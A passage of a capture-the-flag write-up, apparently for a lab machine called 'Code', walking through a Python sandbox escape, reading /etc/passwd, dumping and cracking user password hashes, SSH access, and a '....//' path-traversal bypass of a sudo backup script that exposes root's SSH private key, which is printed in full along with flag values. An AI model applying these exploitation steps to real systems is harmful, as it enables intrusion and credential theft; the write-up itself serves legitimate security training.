'sqlalchemy.orm.relationships.JoinCondition'>, <class 'sqlalchemy.orm.relationships._ColInAnnotations'>, <class 'sqlalchemy.orm.query.BulkUD'>, <class 'sqlalchemy.orm.evaluator._EvaluatorCompiler'>, <class 'sqlalchemy.orm.identity.IdentityMap'>, <class 'sqlalchemy.orm.state_changes._StateChange'>, <class 'sqlalchemy.orm.unitofwork.UOWTransaction'>, <class 'sqlalchemy.orm.unitofwork.IterateMappersMixin'>, <class 'sqlalchemy.orm.unitofwork.PostSortRec'>, <class 'sqlalchemy.orm.session._SessionClassMethods'>, <class 'sqlalchemy.orm.clsregistry.ClsRegistryToken'>, <class 'sqlalchemy.orm.clsregistry._ModNS'>, <class 'sqlalchemy.orm.clsregistry._GetColumns'>, <class 'sqlalchemy.orm.clsregistry._GetTable'>, <class 'sqlalchemy.orm.clsregistry._class_resolver'>, <class 'sqlalchemy.orm.decl_base._MapperConfig'>, <class 'sqlalchemy.orm.decl_api._declared_attr_common'>, <class 'sqlalchemy.orm.decl_api.MappedAsDataclass'>, <class 'sqlalchemy.orm.decl_api.registry'>, <class 'sqlalchemy.orm.strategies.LoadDeferredColumns'>, <class 'sqlalchemy.orm.strategies.LoadLazyAttribute'>, <class 'sqlalchemy.orm.strategies.SubqueryLoader._SubqCollections'>, <class 'sqlalchemy.orm.writeonly.DynamicCollectionAdapter'>, <class 'sqlalchemy.orm.events._InstrumentationEventsHold'>, <class 'sqlalchemy.orm.dependency.DependencyProcessor'>, <class 'flask_sqlalchemy.pagination.Pagination'>, <class 'flask_sqlalchemy.model._QueryProperty'>, <class 'flask_sqlalchemy.model.Model'>, <class 'flask_sqlalchemy.model.BindMixin'>, <class 'flask_sqlalchemy.model.NameMixin'>, <class 'flask_sqlalchemy.extension.SQLAlchemy'>, <class 'sqlalchemy.dialects.sqlite.json._FormatTypeMixin'>, <class 'sqlalchemy.dialects.sqlite.base._DateTimeMixin'>, <class 'sqlalchemy.dialects.sqlite.aiosqlite.AsyncAdapt_aiosqlite_cursor'>, <class 'sqlalchemy.dialects.sqlite.aiosqlite.AsyncAdapt_aiosqlite_dbapi'>, <class 'sqlite3.Row'>, <class 'sqlite3.Cursor'>, <class 'sqlite3.Connection'>, <class 'sqlite3Node'>, <class 'sqlite3.Cache'>, <class 'sqlite3.Statement'>, <class 'sqlite3.PrepareProtocol'>, <class 'unicodedata.UCD'>]
```

![](images/2025-03-22_20-26_5000_subclasses.png)

Since `arbitrary code execution` was not really working for us, we moved on and checked which possibilities were present in terms of `file handling` to maybe read files on the system.

```shell
for x in (1).__class__.__base__.__subclasses__():
    if "File" in str(x):
        print(x)
```

```shell
<class '_frozen_importlib_external.FileLoader'> <class '_frozen_importlib_external.FileFinder'> <class 'zipfile._SharedFile'> <class 'zipfile.ZipFile'> <class 'email.feedparser.BufferedSubFile'> <class 'tempfile._TemporaryFileCloser'> <class 'tempfile._TemporaryFileWrapper'> <class 'tempfile.SpooledTemporaryFile'> <class 'argparse.FileType'> <class 'gunicorn.http.wsgi.FileWrapper'> <class 'werkzeug.datastructures.file_storage.FileStorage'> <class 'werkzeug.wsgi.FileWrapper'> <class 'click._compat._AtomicFile'> <class 'click.utils.LazyFile'> <class 'click.utils.KeepOpenFile'> <class 'importlib.metadata.FileHash'>
```

![](images/2025-03-22_20-35_5000_fileio_subclasses.png)

### Bypassing Security Checks

We used `FileLoader` to `read files on disk` and started with `/etc/passwd` which lead us to two `usernames`.

```shell
for x in (1).__class__.__base__.__subclasses__():
    if "FileLoader" in str(x):
        f = x("a", "/etc/passwd")
        print(f.get_data("/etc/passwd").decode())
        break
```

```shell
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false app-production:x:1001:1001:,,,:/home/app-production:/bin/bash martin:x:1000:1000:,,,:/home/martin:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false
```

![](images/2025-03-22_20-36_5000_file_read.png)

| Username       |
| -------------- |
| app-production |
| martin         |

Since the application allowed us to `register` and `login` and also to `store` our `code snippets`, `mk0` came up with the idea to try to query the `back-end database` for `credentials`.

```shell
print([(user.id, user.username, user.password) for user in User.query.all()])
```

```shell
[(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'), (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]
```

![](images/2025-03-22_20-42_5000_credentials.png)

| Hash                             |
| -------------------------------- |
| 759b74ce43947f5f4c91aeddc3e5bad3 |
| 3de6f30c4a09c27fc71932bfc68474be |

### Retrieving Passwords from leaked Hashes

It gave us two `hashes` which we throw into `crackstation.net` to receive the `passwords`.

- [https://crackstation.net/](https://crackstation.net/)

| Username        | Password           |
| --------------- | ------------------ |
| app-development | development        |
| martin          | nafeelswordsmaster |

With the `password` of `martin` we were able to login via `SSH`.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh martin@10.129.231.240
The authenticity of host '10.129.231.240 (10.129.231.240)' can't be established.
ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.231.240' (ED25519) to the list of known hosts.
martin@10.129.231.240's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 22 Mar 2025 07:44:41 PM UTC

  System load:           0.0
  Usage of /:            49.2% of 5.33GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.231.240
  IPv6 address for eth0: dead:beef::250:56ff:fe94:4192


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Mar 22 19:44:42 2025 from 10.10.14.74
martin@code:~$
```

## Enumeration

A quick enumeration showed that `martin` was allowed to `execute a script` called `backy.sh` using `sudo`.

```shell
martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
```

```shell
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

### Analysis of backy.sh

The script utilized `jq` in order to prevent `path traversal` attacks while performing `backup tasks` to `backup` the directories `/var/` and `/home/`. It used a `task.json` files as `configuration file`.

```bash
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

```shell
martin@code:~/backups$ ls -la
total 20
drwxr-xr-x 2 martin martin 4096 Mar 22 20:00 .
drwxr-x--- 7 martin martin 4096 Mar 22 20:01 ..
-rw-r--r-- 1 martin martin 5879 Mar 22 20:00 code_home_app-production_app_2024_August.tar.bz2
-rw-r--r-- 1 martin martin  181 Mar 22 20:00 task.json
```

```shell
martin@code:~/backups$ cat task.json 
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
```

```shell
martin@code:~$ sudo /usr/bin/backy.sh backups/task.json
2025/03/22 20:04:33 🍀 backy 1.2
2025/03/22 20:04:33 📋 Working with backups/task.json ...
2025/03/22 20:04:33 💤 Nothing to sync
2025/03/22 20:04:33 📤 Archiving: [/home/app-production/app]
2025/03/22 20:04:33 📥 To: /home/martin/backups ...
2025/03/22 20:04:33 📦
```

```shell
martin@code:~$ ls -la backups/
total 32
drwxr-xr-x 2 martin martin 4096 Mar 22 20:04 .
drwxr-x--- 7 martin martin 4096 Mar 22 20:01 ..
-rw-r--r-- 1 martin martin 5879 Mar 22 20:00 code_home_app-production_app_2024_August.tar.bz2
-rw-r--r-- 1 root   root   8520 Mar 22 20:04 code_home_app-production_app_2025_March.tar.bz2
-rw-r--r-- 1 martin martin  191 Mar 22 20:04 task.json
```

## Privilege Escalation to root

### Path Traversal

We tried bypassing the filter by adding `....//` to our payload to avoid that `jq` cut of typical `path traversal payloads` like `../../../`. Shout-out to `mentats` for this smooth addition to our initial approaches.

```shell
jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))'
```

We modified the `task.json` file and pointed it to `/root` using `path traversal` in order to backup the whole directory of `/root` containing the `root.txt` and also an `SSH private key` for `root`.

```shell
martin@code:~$ cat > /home/martin/backups/task.json <<EOF
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
EOF
```

```shell
martin@code:~$ sudo /usr/bin/backy.sh backups/task.json
2025/03/22 20:30:06 🍀 backy 1.2
2025/03/22 20:30:06 📋 Working with backups/task.json ...
2025/03/22 20:30:06 💤 Nothing to sync
2025/03/22 20:30:06 📤 Archiving: [/var/../root]
2025/03/22 20:30:06 📥 To: /home/martin ...
2025/03/22 20:30:06 📦
tar: Removing leading `/var/../' from member names
/var/../root/
/var/../root/.local/
/var/../root/.local/share/
/var/../root/.local/share/nano/
/var/../root/.local/share/nano/search_history
/var/../root/.selected_editor
/var/../root/.sqlite_history
/var/../root/.profile
/var/../root/scripts/
/var/../root/scripts/cleanup.sh
/var/../root/scripts/backups/
/var/../root/scripts/backups/task.json
/var/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
/var/../root/scripts/database.db
/var/../root/scripts/cleanup2.sh
/var/../root/.python_history
/var/../root/root.txt
/var/../root/.cache/
/var/../root/.cache/motd.legal-displayed
/var/../root/.ssh/
/var/../root/.ssh/id_rsa
/var/../root/.ssh/authorized_keys
/var/../root/.bash_history
/var/../root/.bashrc
```

```shell
martin@code:~$ ls -la
total 60
drwxr-x--- 7 martin martin  4096 Mar 22 20:32 .
drwxr-xr-x 4 root   root    4096 Aug 27  2024 ..
drwxr-xr-x 2 martin martin  4096 Mar 22 20:30 backups
lrwxrwxrwx 1 root   root       9 Aug 27  2024 .bash_history -> /dev/null
-rw-r--r-- 1 martin martin   220 Aug 27  2024 .bash_logout
-rw-r--r-- 1 martin martin  3771 Aug 27  2024 .bashrc
drwx------ 2 martin martin  4096 Mar 22 19:45 .cache
-rw-r--r-- 1 root   root   12913 Mar 22 20:30 code_var_.._root_2025_March.tar.bz2
drwxrwxr-x 2 martin martin  4096 Feb 17 10:58 .local
-rw-r--r-- 1 martin martin   807 Aug 27  2024 .profile
lrwxrwxrwx 1 root   root       9 Aug 27  2024 .python_history -> /dev/null
drwxrwxr-x 3 martin martin  4096 Mar 22 20:32 root
lrwxrwxrwx 1 root   root       9 Aug 27  2024 .sqlite_history -> /dev/null
drwx------ 2 martin martin  4096 Sep 16  2024 .ssh
```

We extracted the `.tar.bz2 archive` in the `home directory` of `martin` and used the `SSH private key` to `login` as `root` and to finally grab the `user.txt` and the `root.txt`.

```shell
martin@code:~$ tar -xvf code_var_.._root_2025_March.tar.bz2
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
```

```shell
martin@code:~$ cat root/.ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
hdENGN+hVCh//jFwAAAAlyb290QGNvZGU=
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Code/files]
└─$ chmod 600 root_id_rsa
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Code/files]
└─$ ssh -i root_id_rsa root@10.129.231.240
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 22 Mar 2025 08:35:21 PM UTC

  System load:           0.96
  Usage of /:            51.4% of 5.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.129.231.240
  IPv6 address for eth0: dead:beef::250:56ff:fe94:4192


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Mar 22 20:35:22 2025 from 10.10.14.74
root@code:~#
```

## user.txt

```c
root@code:~# cat /home/app-production/user.txt 
386dd7c4adac168d7556d0dd9aa602c0
```

## root.txt

```c
root@code:~# cat root.txt 
f8cca99be2cb9ce5bffdf601dbefbedf
```
